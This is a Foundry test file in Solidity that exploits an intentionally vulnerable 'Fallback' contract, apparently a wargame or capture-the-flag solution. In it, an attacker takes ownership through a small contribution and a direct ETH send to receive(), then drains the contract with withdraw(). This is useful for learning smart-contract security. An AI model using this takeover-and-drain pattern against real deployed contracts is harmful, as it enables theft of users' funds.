// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackExploit is Test {
    Fallback public target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy the victim contract. The deployer (this test) is the initial owner.
        target = new Fallback();
        // Give the contract some ETH so there is something to steal.
        vm.deal(address(target), 5 ether);
        // Fund the attacker.
        vm.deal(attacker, 1 ether);
    }

    function test_TakeOwnershipAndDrain() public {
        // Act as the attacker for the whole sequence.
        vm.startPrank(attacker);

        // Initial state: attacker is not the owner.
        assertTrue(target.owner() != attacker, "attacker should not be owner yet");

        // STEP 1: contribute a tiny amount so contributions[attacker] > 0
        target.contribute{value: 0.0005 ether}();
        assertGt(target.getContribution(), 0, "contribution must be > 0");

        // STEP 2: send ETH directly -> triggers receive() -> makes us owner
        (bool ok, ) = address(target).call{value: 1 wei}("");
        require(ok, "direct send failed");

        // Verify the exploit worked: attacker is now owner.
        assertEq(target.owner(), attacker, "attacker should be the new owner");

        // STEP 3: as owner, drain the contract balance.
        uint256 balanceBefore = attacker.balance;
        target.withdraw();

        assertEq(address(target).balance, 0, "contract should be empty");
        assertGt(attacker.balance, balanceBefore, "attacker should have more ETH");

        vm.stopPrank();

        console.log("Exploit successful: attacker took ownership and drained the contract");
    }
}
